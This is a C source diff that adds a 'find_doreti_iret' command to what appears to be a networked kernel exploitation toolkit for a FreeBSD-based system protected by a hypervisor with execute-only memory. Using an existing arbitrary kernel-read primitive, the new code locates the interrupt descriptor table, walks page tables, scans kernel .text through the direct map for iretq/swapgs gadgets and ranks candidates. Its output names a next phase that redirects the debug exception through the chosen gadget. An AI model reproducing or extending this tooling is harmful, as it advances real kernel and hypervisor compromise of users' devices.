@@ -31,6 +31,8 @@ along with this program; see the file COPYING. If not, see
  *   scan_pte <va> <n> [s]    - Scan PTEs for address range
  *   cmp_sections             - Compare .text vs .data page mappings
  *   probe_xom                - Analyze XOM protection mechanism
+ *   dump_idt                 - Dump IDT (handlers, IST, types)
+ *   find_doreti_iret         - Find doreti_iret gadget in kernel .text
  *   exit        - Close connection
  */
 
@@ -2499,6 +2501,528 @@ cmd_dump_idt(int sock)
     send_response(sock, "OK\n");
 }
 
+/*
+ * find_doreti_iret - Phase 7b: Locate doreti_iret gadget in kernel .text
+ *
+ * In FreeBSD the interrupt return path goes through doreti -> doreti_iret
+ * where iretq executes to return from interrupt/exception context.
+ * The #GP handler references this address for fault-on-iret detection.
+ *
+ * This command:
+ *   1. Discovers IDT and extracts key handler addresses (#DB, #DF, #GP)
+ *   2. Walks page tables to get handler physical addresses
+ *   3. Scans DMAP-accessible physical pages around handlers for iretq
+ *   4. Broader scan of kernel .text physical region
+ *   5. Classifies candidates by proximity to #GP and swapgs presence
+ */
+static void
+cmd_find_doreti_iret(int sock)
+{
+    intptr_t ktext_base = KERNEL_ADDRESS_TEXT_BASE;
+    intptr_t kdata_base = KERNEL_ADDRESS_DATA_BASE;
+    uint64_t pm_cr3 = get_kernel_cr3();
+    uint64_t dmap_base = get_dmap_base();
+
+    /* Byte signatures */
+    static const uint8_t sig_iretq[]  = {0x48, 0xcf};
+    static const uint8_t sig_swapgs[] = {0x0f, 0x01, 0xf8};
+
+    /* Candidate storage */
+    #define MAX_DORETI_CANDIDATES 64
+    struct doreti_candidate {
+        uint64_t paddr;
+        uint64_t ktext_offset;
+        int has_swapgs_before;
+        int near_handler;       /* vec number, or 0 for broad scan */
+        int page_dist;
+    } candidates[MAX_DORETI_CANDIDATES];
+    int num_candidates = 0;
+
+    /* Key handler info */
+    struct {
+        int vec;
+        const char *name;
+        uint64_t handler_va;
+        uint8_t ist;
+        uint64_t handler_pa;
+        int pa_valid;
+        int dmap_readable;
+    } key_handlers[3] = {
+        { 1,  "#DB Debug",       0, 0, 0, 0, 0},
+        { 8,  "#DF DoubleFault", 0, 0, 0, 0, 0},
+        {13,  "#GP GenProt",     0, 0, 0, 0, 0},
+    };
+
+    send_response(sock, "=== Phase 7b: doreti_iret Finder ===\n\n");
+
+    /* ---- Step 1: IDT Discovery (reuse SIDT approach from dump_idt) ---- */
+    send_response(sock, "--- Step 1: IDT Discovery ---\n");
+
+    uint64_t idt_base = 0;
+    int found_idt = 0;
+
+    /* Method 1: SIDT instruction */
+    {
+        struct sigaction sa, old_segv, old_bus, old_ill;
+        memset(&sa, 0, sizeof(sa));
+        sa.sa_handler = probe_signal_handler;
+        sigemptyset(&sa.sa_mask);
+        sa.sa_flags = 0;
+        sigaction(SIGSEGV, &sa, &old_segv);
+        sigaction(SIGBUS, &sa, &old_bus);
+        sigaction(SIGILL, &sa, &old_ill);
+
+        probe_fault_occurred = 0;
+        if (sigsetjmp(probe_jmp_env, 1) == 0) {
+            struct {
+                uint16_t limit;
+                uint64_t base;
+            } __attribute__((packed)) idtr;
+            __asm__ __volatile__("sidt %0" : "=m"(idtr));
+            idt_base = idtr.base;
+            found_idt = 1;
+            send_response(sock, "IDT base: 0x%lx (via SIDT)\n", idt_base);
+        } else {
+            send_response(sock, "SIDT faulted (UMIP enabled)\n");
+        }
+
+        sigaction(SIGSEGV, &old_segv, NULL);
+        sigaction(SIGBUS, &old_bus, NULL);
+        sigaction(SIGILL, &old_ill, NULL);
+    }
+
+    /* Method 2: Scan .data for cached IDTR */
+    if (!found_idt) {
+        send_response(sock, "Scanning .data for IDTR...\n");
+        uint8_t scan_buf[4096];
+        uint64_t scan_end = (uint64_t)kdata_base + 0x1000000;
+
+        for (uint64_t addr = (uint64_t)kdata_base;
+             addr < scan_end && !found_idt; addr += sizeof(scan_buf)) {
+            if (kernel_copyout(addr, scan_buf, sizeof(scan_buf)) != 0)
+                continue;
+            for (int i = 0; i <= (int)sizeof(scan_buf) - 10; i += 2) {
+                uint16_t limit;
+                uint64_t base;
+                memcpy(&limit, scan_buf + i, 2);
+                memcpy(&base, scan_buf + i + 2, 8);
+
+                if (limit != 0x0FFF)
+                    continue;
+                if ((base >> 40) != 0xFFFFFF)
+                    continue;
+
+                /* Validate first IDT entry */
+                uint8_t entry[16];
+                if (kernel_copyout(base, entry, 16) != 0)
+                    continue;
+                uint8_t p = (entry[5] >> 7) & 1;
+                uint8_t type = entry[5] & 0x0F;
+                uint16_t sel;
+                memcpy(&sel, entry + 2, 2);
+
+                if (p == 1 && (type == 14 || type == 15) && sel == 0x20) {
+                    idt_base = base;
+                    found_idt = 1;
+                    send_response(sock, "IDT base: 0x%lx (from .data scan)\n", idt_base);
+                    break;
+                }
+            }
+        }
+    }
+
+    if (!found_idt) {
+        send_response(sock, "ERROR: Could not locate IDT\n");
+        send_response(sock, "OK\n");
+        return;
+    }
+
+    /* Read full IDT */
+    uint8_t idt[4096];
+    if (kernel_copyout(idt_base, idt, sizeof(idt)) != 0) {
+        send_response(sock, "ERROR: Failed to read IDT at 0x%lx\n", idt_base);
+        send_response(sock, "OK\n");
+        return;
+    }
+
+    /* ---- Step 2: Extract Key Handler Addresses ---- */
+    send_response(sock, "\n--- Step 2: Key Handler Addresses ---\n");
+    send_response(sock, "%-4s %-16s %-22s %s\n", "Vec", "Name", "Handler", "IST");
+    send_response(sock, "---- ---------------- ---------------------- ---\n");
+
+    for (int h = 0; h < 3; h++) {
+        int v = key_handlers[h].vec;
+        uint8_t *e = idt + v * 16;
+
+        uint16_t off_low, off_mid;
+        uint32_t off_high;
+        memcpy(&off_low, e + 0, 2);
+        memcpy(&off_mid, e + 6, 2);
+        memcpy(&off_high, e + 8, 4);
+
+        uint64_t handler = (uint64_t)off_low |
+                           ((uint64_t)off_mid << 16) |
+                           ((uint64_t)off_high << 32);
+        uint8_t ist = e[4] & 0x07;
+        uint8_t p = (e[5] >> 7) & 0x01;
+
+        key_handlers[h].handler_va = handler;
+        key_handlers[h].ist = ist;
+
+        if (!p) {
+            send_response(sock, "%3d  %-16s (not present)\n", v, key_handlers[h].name);
+            continue;
+        }
+
+        if (handler >= (uint64_t)ktext_base &&
+            handler < (uint64_t)ktext_base + 0x1000000) {
+            send_response(sock, "%3d  %-16s ktext+0x%-14lx %d\n",
+                          v, key_handlers[h].name,
+                          handler - (uint64_t)ktext_base, ist);
+        } else {
+            send_response(sock, "%3d  %-16s 0x%-20lx %d\n",
+                          v, key_handlers[h].name, handler, ist);
+        }
+    }
+
+    /* ---- Step 3: Get Physical Addresses ---- */
+    send_response(sock, "\n--- Step 3: Handler Physical Addresses ---\n");
+    send_response(sock, "%-4s %-20s %-18s %s\n",
+                  "Vec", "Handler VA", "Physical Addr", "DMAP");
+    send_response(sock, "---- -------------------- ------------------ --------\n");
+
+    for (int h = 0; h < 3; h++) {
+        if (key_handlers[h].handler_va == 0)
+            continue;
+
+        uint64_t paddr, flags;
+        if (vaddr_to_paddr_quiet(dmap_base, pm_cr3,
+                                 key_handlers[h].handler_va,
+                                 &paddr, &flags) == 0) {
+            key_handlers[h].handler_pa = paddr;
+            key_handlers[h].pa_valid = 1;
+
+            /* Test DMAP readability */
+            uint8_t test[8];
+            if (kernel_copyout(dmap_base + paddr, test, sizeof(test)) == 0) {
+                key_handlers[h].dmap_readable = 1;
+                send_response(sock, "%3d  0x%016lx   0x%014lx   READABLE\n",
+                              key_handlers[h].vec,
+                              key_handlers[h].handler_va, paddr);
+            } else {
+                send_response(sock, "%3d  0x%016lx   0x%014lx   BLOCKED\n",
+                              key_handlers[h].vec,
+                              key_handlers[h].handler_va, paddr);
+            }
+        } else {
+            send_response(sock, "%3d  0x%016lx   TRANSLATION FAILED\n",
+                          key_handlers[h].vec,
+                          key_handlers[h].handler_va);
+        }
+    }
+
+    /* ---- Step 4: Scan Handler Vicinity ---- */
+    send_response(sock, "\n--- Step 4: Scanning Handler Vicinity (+-32KB) ---\n");
+
+    int vicinity_pages_readable = 0, vicinity_pages_blocked = 0;
+    uint8_t page_buf[4096];
+
+    for (int h = 0; h < 3; h++) {
+        if (!key_handlers[h].pa_valid || !key_handlers[h].dmap_readable)
+            continue;
+
+        uint64_t base_pa = key_handlers[h].handler_pa & ~0xFFFUL;
+        /* Scan 8 pages before and 8 pages after (64KB window) */
+        uint64_t scan_start = (base_pa > 8 * 0x1000) ? base_pa - 8 * 0x1000 : 0;
+        uint64_t scan_end = base_pa + 8 * 0x1000;
+
+        send_response(sock, "Scanning around vec %d %s (PA 0x%lx)...\n",
+                      key_handlers[h].vec, key_handlers[h].name, base_pa);
+
+        for (uint64_t pa = scan_start; pa < scan_end; pa += 0x1000) {
+            if (kernel_copyout(dmap_base + pa, page_buf, sizeof(page_buf)) != 0) {
+                vicinity_pages_blocked++;
+                continue;
+            }
+            vicinity_pages_readable++;
+
+            /* Search for iretq in this page */
+            for (size_t i = 0; i < sizeof(page_buf) - 1; i++) {
+                if (memcmp(&page_buf[i], sig_iretq, sizeof(sig_iretq)) != 0)
+                    continue;
+
+                if (num_candidates >= MAX_DORETI_CANDIDATES)
+                    goto vicinity_done;
+
+                /* Check for swapgs within 32 bytes before iretq */
+                int has_swapgs = 0;
+                size_t check_start = (i >= 32) ? i - 32 : 0;
+                for (size_t j = check_start; j + 2 < i; j++) {
+                    if (memcmp(&page_buf[j], sig_swapgs, sizeof(sig_swapgs)) == 0) {
+                        has_swapgs = 1;
+                        break;
+                    }
+                }
+
+                uint64_t cand_pa = pa + i;
+                /* Estimate ktext offset: handler_va + (cand_pa - handler_pa) */
+                uint64_t est_ktext_off = (key_handlers[h].handler_va -
+                                          (uint64_t)ktext_base) +
+                                         (int64_t)(cand_pa - key_handlers[h].handler_pa);
+                int page_dist = (int)((int64_t)(pa - base_pa) / 0x1000);
+
+                candidates[num_candidates].paddr = cand_pa;
+                candidates[num_candidates].ktext_offset = est_ktext_off;
+                candidates[num_candidates].has_swapgs_before = has_swapgs;
+                candidates[num_candidates].near_handler = key_handlers[h].vec;
+                candidates[num_candidates].page_dist = page_dist;
+                num_candidates++;
+
+                send_response(sock, "  iretq @ PA 0x%lx (est ktext+0x%lx) swapgs=%s\n",
+                              cand_pa, est_ktext_off,
+                              has_swapgs ? "YES" : "NO");
+            }
+        }
+    }
+vicinity_done:
+
+    send_response(sock, "Handler vicinity: %d candidates, %d pages readable, %d blocked\n",
+                  num_candidates, vicinity_pages_readable, vicinity_pages_blocked);
+
+    /* ---- Step 5: Broad Kernel .text Physical Scan ---- */
+    send_response(sock, "\n--- Step 5: Broad Kernel .text Physical Scan ---\n");
+
+    int broad_new = 0;
+    int broad_readable = 0, broad_blocked = 0;
+
+    /* Try to determine .text physical address range */
+    uint64_t text_pa = 0;
+    uint64_t text_flags;
+    int have_text_pa = (vaddr_to_paddr_quiet(dmap_base, pm_cr3,
+                        (uint64_t)ktext_base, &text_pa, &text_flags) == 0);
+
+    /* Determine scan range */
+    uint64_t broad_start, broad_end;
+    if (have_text_pa) {
+        send_response(sock, "ktext PA: 0x%lx (from page table walk)\n", text_pa);
+        broad_start = (text_pa & ~0xFFFUL);
+        broad_end = broad_start + 0x400000; /* 4MB */
+    } else {
+        /* Use handler PA as anchor, scan wider range */
+        send_response(sock, "ktext PA translation failed, using handler PA as anchor\n");
+        uint64_t anchor = 0;
+        for (int h = 0; h < 3; h++) {
+            if (key_handlers[h].pa_valid) {
+                anchor = key_handlers[h].handler_pa;
+                break;
+            }
+        }
+        if (anchor == 0) {
+            send_response(sock, "No anchor PA available, skipping broad scan\n");
+            goto classify;
+        }
+        broad_start = (anchor > 0x400000) ? (anchor & ~0xFFFUL) - 0x400000 : 0;
+        broad_end = (anchor & ~0xFFFUL) + 0x400000;
+    }
+
+    /* Cap at 2048 pages (8MB) */
+    if ((broad_end - broad_start) / 0x1000 > 2048)
+        broad_end = broad_start + 2048 * 0x1000;
+
+    send_response(sock, "Scan range: PA 0x%lx - 0x%lx (%lu pages)\n",
+                  broad_start, broad_end,
+                  (broad_end - broad_start) / 0x1000);
+
+    for (uint64_t pa = broad_start;
+         pa < broad_end && num_candidates < MAX_DORETI_CANDIDATES;
+         pa += 0x1000) {
+
+        if (kernel_copyout(dmap_base + pa, page_buf, sizeof(page_buf)) != 0) {
+            broad_blocked++;
+            continue;
+        }
+        broad_readable++;
+
+        for (size_t i = 0; i < sizeof(page_buf) - 1; i++) {
+            if (memcmp(&page_buf[i], sig_iretq, sizeof(sig_iretq)) != 0)
+                continue;
+
+            uint64_t cand_pa = pa + i;
+
+            /* Skip if already found in handler vicinity scan */
+            int already_found = 0;
+            for (int c = 0; c < num_candidates - broad_new; c++) {
+                if (candidates[c].paddr == cand_pa) {
+                    already_found = 1;
+                    break;
+                }
+            }
+            if (already_found)
+                continue;
+
+            if (num_candidates >= MAX_DORETI_CANDIDATES)
+                goto broad_done;
+
+            /* Check for swapgs within 32 bytes before */
+            int has_swapgs = 0;
+            size_t check_start = (i >= 32) ? i - 32 : 0;
+            for (size_t j = check_start; j + 2 < i; j++) {
+                if (memcmp(&page_buf[j], sig_swapgs, sizeof(sig_swapgs)) == 0) {
+                    has_swapgs = 1;
+                    break;
+                }
+            }
+
+            /* Estimate ktext offset using text_pa if available */
+            uint64_t est_ktext_off;
+            if (have_text_pa) {
+                est_ktext_off = cand_pa - text_pa;
+            } else {
+                /* Estimate from nearest handler */
+                est_ktext_off = 0;
+                for (int h = 0; h < 3; h++) {
+                    if (key_handlers[h].pa_valid) {
+                        est_ktext_off = (key_handlers[h].handler_va -
+                                         (uint64_t)ktext_base) +
+                                        (int64_t)(cand_pa - key_handlers[h].handler_pa);
+                        break;
+                    }
+                }
+            }
+
+            /* Determine nearest handler */
+            int nearest = 0;
+            int nearest_dist = 0x7FFFFFFF;
+            for (int h = 0; h < 3; h++) {
+                if (!key_handlers[h].pa_valid)
+                    continue;
+                int64_t d = (int64_t)(cand_pa - key_handlers[h].handler_pa);
+                int dist_pages = (int)(d / 0x1000);
+                if (dist_pages < 0) dist_pages = -dist_pages;
+                if (dist_pages < nearest_dist) {
+                    nearest_dist = dist_pages;
+                    nearest = key_handlers[h].vec;
+                }
+            }
+
+            candidates[num_candidates].paddr = cand_pa;
+            candidates[num_candidates].ktext_offset = est_ktext_off;
+            candidates[num_candidates].has_swapgs_before = has_swapgs;
+            candidates[num_candidates].near_handler = (nearest_dist <= 16) ? nearest : 0;
+            candidates[num_candidates].page_dist = nearest_dist;
+            num_candidates++;
+            broad_new++;
+
+            if (has_swapgs) {
+                send_response(sock, "  iretq @ PA 0x%lx (est ktext+0x%lx) swapgs=YES [new]\n",
+                              cand_pa, est_ktext_off);
+            }
+        }
+    }
+broad_done:
+
+    send_response(sock, "Broad scan: %d new candidates, %d pages readable, %d blocked\n",
+                  broad_new, broad_readable, broad_blocked);
+
+    /* ---- Step 6: Classification ---- */
+classify:
+    send_response(sock, "\n--- Step 6: doreti_iret Candidates ---\n");
+
+    if (num_candidates == 0) {
+        send_response(sock, "No iretq candidates found.\n");
+        send_response(sock, "All kernel .text pages may be HV-protected (XOM via DMAP).\n");
+        send_response(sock, "OK\n");
+        return;
+    }
+
+    send_response(sock, "%-3s %-16s %-14s %-7s %-8s %-6s %s\n",
+                  "#", "PA", "ktext+offset", "swapgs", "near", "dist", "class");
+    send_response(sock, "--- ---------------- -------------- ------- -------- ------ --------\n");
+
+    int likely_count = 0, possible_count = 0, other_count = 0;
+    int best_idx = -1;
+    int best_score = -1;
+
+    for (int c = 0; c < num_candidates; c++) {
+        const char *classification;
+        int score = 0;
+
+        int near_gp = (candidates[c].near_handler == 13 && candidates[c].page_dist <= 16);
+        int has_sg = candidates[c].has_swapgs_before;
+
+        if (has_sg && near_gp) {
+            classification = "LIKELY";
+            score = 3;
+            likely_count++;
+        } else if (has_sg || near_gp) {
+            classification = "POSSIBLE";
+            score = 2;
+            possible_count++;
+        } else {
+            classification = "other";
+            score = 1;
+            other_count++;
+        }
+
+        /* Prefer LIKELY with smallest distance to #GP handler */
+        if (score > best_score ||
+            (score == best_score && near_gp && candidates[c].page_dist < candidates[best_idx].page_dist)) {
+            best_score = score;
+            best_idx = c;
+        }
+
+        /* Show LIKELY and POSSIBLE always, limit OTHER output */
+        if (score >= 2 || other_count <= 10) {
+            char near_str[16];
+            if (candidates[c].near_handler > 0)
+                snprintf(near_str, sizeof(near_str), "vec %d", candidates[c].near_handler);
+            else
+                snprintf(near_str, sizeof(near_str), "-");
+
+            send_response(sock, "%-3d 0x%014lx ktext+0x%-6lx %-7s %-8s %+dpg   %s\n",
+                          c + 1,
+                          candidates[c].paddr,
+                          candidates[c].ktext_offset,
+                          has_sg ? "YES" : "NO",
+                          near_str,
+                          candidates[c].page_dist,
+                          classification);
+        }
+    }
+
+    if (other_count > 10)
+        send_response(sock, "... (%d more 'other' iretq entries omitted)\n", other_count - 10);
+
+    /* Summary */
+    send_response(sock, "\n--- Summary ---\n");
+    send_response(sock, "Total iretq found: %d\n", num_candidates);
+    send_response(sock, "  LIKELY doreti_iret: %d\n", likely_count);
+    send_response(sock, "  POSSIBLE:          %d\n", possible_count);
+    send_response(sock, "  Other iretq:       %d\n", other_count);
+
+    if (best_idx >= 0 && best_score >= 2) {
+        send_response(sock, "\nBest candidate: PA 0x%lx (est ktext+0x%lx)\n",
+                      candidates[best_idx].paddr,
+                      candidates[best_idx].ktext_offset);
+        send_response(sock, "  swapgs before iretq: %s\n",
+                      candidates[best_idx].has_swapgs_before ? "YES" : "NO");
+        if (candidates[best_idx].near_handler > 0)
+            send_response(sock, "  near handler: vec %d (%+d pages)\n",
+                          candidates[best_idx].near_handler,
+                          candidates[best_idx].page_dist);
+    } else {
+        send_response(sock, "\nNo strong doreti_iret candidate found.\n");
+    }
+
+    send_response(sock, "\nNotes:\n");
+    send_response(sock, "  doreti_iret is the iretq in the interrupt return path\n");
+    send_response(sock, "  #GP handler references it for fault-on-iret detection\n");
+    send_response(sock, "  Phase 7c will redirect #DB to singlestep through this instruction\n");
+    send_response(sock, "OK\n");
+
+    #undef MAX_DORETI_CANDIDATES
+}
+
 /* Display kernel information */
 static void
 cmd_kinfo(int sock) {
@@ -2663,6 +3187,8 @@ handle_command(int sock, char *cmd) {
         cmd_find_cfi_targets(sock);
     } else if (strcmp(cmd, "dump_idt") == 0) {
         cmd_dump_idt(sock);
+    } else if (strcmp(cmd, "find_doreti_iret") == 0) {
+        cmd_find_doreti_iret(sock);
     } else if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
         send_response(sock, "Goodbye!\n");
         return -1;
@@ -2695,6 +3221,7 @@ handle_command(int sock, char *cmd) {
         send_response(sock, "analyze_apic_ops <off>   - Full apic_ops analysis (36 entries)\n");
         send_response(sock, "find_cfi_targets         - Find CFI-valid function targets\n");
         send_response(sock, "dump_idt                 - Dump IDT (handlers, IST, types)\n");
+        send_response(sock, "find_doreti_iret         - Find doreti_iret gadget in kernel .text\n");
         send_response(sock, "\nexit                     - Close connection\n");
         send_response(sock, "help                     - Show this help\n");
     } else {
